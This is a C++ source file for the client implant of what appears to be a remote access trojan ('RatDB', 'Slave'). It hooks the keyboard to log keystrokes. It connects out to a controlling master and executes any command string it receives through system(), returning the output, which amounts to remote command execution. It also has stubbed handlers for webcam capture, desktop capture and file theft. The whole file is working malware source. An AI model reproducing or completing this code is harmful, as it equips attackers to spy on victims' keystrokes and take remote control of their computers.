// SunFrog.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Vector>
#include <thread>

#include "../WinNetlib/Single/Single_NetworkHandlerServer.h"
#include "../UsefulFuncts/UsefulFuncts.h"


#include<mysql.h>
#include "../DataBase/DataBase.h"

#include "../Shared.h"

#include<filesystem>
#include <fstream>

#include "../KeyLogger/KeyLogger.h"

using namespace std;

namespace fs = std::filesystem;

Single_NetworkHandlerServer Master;

KeyLogger KL;

LRESULT __stdcall HookCallbackKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		*KL.GetKBDS() = *((KBDLLHOOKSTRUCT*)lParam);
		if (wParam == WM_KEYDOWN) {
			char c = MapVirtualKey(KL.GetKBDS()->vkCode, 2);
			cout << c << endl;
		}
	}
	return CallNextHookEx(*KL.GetHK(), nCode, wParam, lParam);
}

int main(int argc, char** argv)
{
	KL.HookCallbackKeyboard = HookCallbackKeyboard;

	thread log = KL.spawn();

	string ServerName;
	string DatabaseIP;
	string DatabaseName;
	int Port;

	DataBase RatDB;

	if (fs::exists("ServerSettings.sys")) {
		fstream serverSettings("ServerSettings.sys", ios::in);
		serverSettings >> ServerName >> DatabaseIP >> DatabaseName >> Port;
	}
	else {
		if (argc < 4) {
			UFuncts::printfC("missing arguments!", 4, 0, 1, 0);
			printf("\n");
			return -1;
		}
		fstream serverSettings("ServerSettings.sys", ios::out);
		UFuncts::printfC("Enter the Name of This Server: ",2,0,1,0);
		getline(cin, ServerName);
		DatabaseIP = argv[1];

		DatabaseName = argv[2];

		Port = atoi(argv[3]);

		serverSettings << ServerName <<" "<< DatabaseIP << " " << DatabaseName << " " << Port;
	}
	

	RatDB = DataBase(DatabaseIP,"Slave","",DatabaseName,Port);

	if (RatDB.Init()) {
		UFuncts::printfC("Connected to DB!", 2, 0, 1, 0);
		printf("\n");
	}

	UFuncts::StdOutRedirect stdoutRedirect(512);
	//Master.RecvFunct = &recv;
	std::string i;
	Packets p;
	Master.SetName("server");
	if (Master.DefaultInitConnect()) {
		while (Master.GetConnected()) {
			Master.RecvDataT<Packets>(&p);
			switch (p)
			{
			case P_CMD:
				Master.RecvDataT<std::string>(&i);
				stdoutRedirect.Start();
				system(i.c_str());
				stdoutRedirect.Stop();
				stdoutRedirect.GetBuffer(&i);
				Master.SendDataT<std::string>(i);
				break;
			case P_MSG:
				printf("<%s>: %s\n", Master.GetConnectedName().c_str(), i.c_str());
				cout << "Enter Response: " << endl;
				getline(cin, i);
				Master.SendDataT<std::string>(i);
				break;
			case P_IMG:
				break;
			case P_FILE:
				break;
			case P_KEYLOG:
				KL.ToggleOn();
				break;
			case P_LiveCAM:
				break;
			case P_SnapCAM:
				break;
			case P_LiveDESK:
				break;
			case P_SnapDesk:
				break;
			case P_SHUTOFF:
				break;
			case P_Disconnect:
				break;
			default:
				printf("<%s>: %s\n", Master.GetConnectedName().c_str(), i.c_str());
				cout << "Enter Response: " << endl;
				getline(cin, i);
				Master.SendDataT<std::string>(i);
				break;
			}
		}
	}
	system("pause");
	Master.DisConnect();
	return 0;
}

